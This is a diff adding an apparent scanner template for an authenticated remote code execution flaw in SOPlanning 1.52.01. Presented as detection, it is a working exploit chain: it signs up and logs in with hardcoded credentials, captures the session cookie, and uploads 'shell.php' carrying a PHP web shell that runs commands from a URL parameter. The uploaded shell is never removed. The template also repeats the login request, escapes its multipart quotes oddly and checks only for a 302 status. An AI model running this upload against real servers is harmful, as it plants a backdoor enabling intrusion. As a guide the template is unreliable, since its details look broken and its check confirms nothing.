@@ -1,0 +1,77 @@
+id: soplanning-rce
+info:
+  name: SOPlanning Authenticated RCE
+  author: your_name
+  severity: high
+  description: |
+    Detects a remote code execution vulnerability in SOPlanning version 1.52.01 through authenticated PHP file upload.
+  tags: rce, authenticated, upload, soplanning
+
+variables:
+  username: "user14"
+  password: "user14"
+
+requests:
+  - raw:
+      - |
+        POST /process/signup.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}&email={{username}}@example.com
+
+  - raw:
+      - |
+        POST /process/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login={{username}}&password={{password}}
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=([^;]+);"
+
+  - raw:
+      - |
+        POST /process/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login={{username}}&password={{password}}
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=([^;]+);"
+
+  - raw:
+      - |
+        POST /process/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name=\"linkid\"
+
+        test123
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name=\"periodeid\"
+
+        0
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name=\"type\"
+
+        upload
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name=\"fichier-0\"; filename=\"shell.php\"
+        Content-Type: application/x-php
+
+        <?php system($_GET['cmd']); ?>
+        ------WebKitFormBoundary--
+
+    matchers:
+      - type: status
+        status:
+          - 302
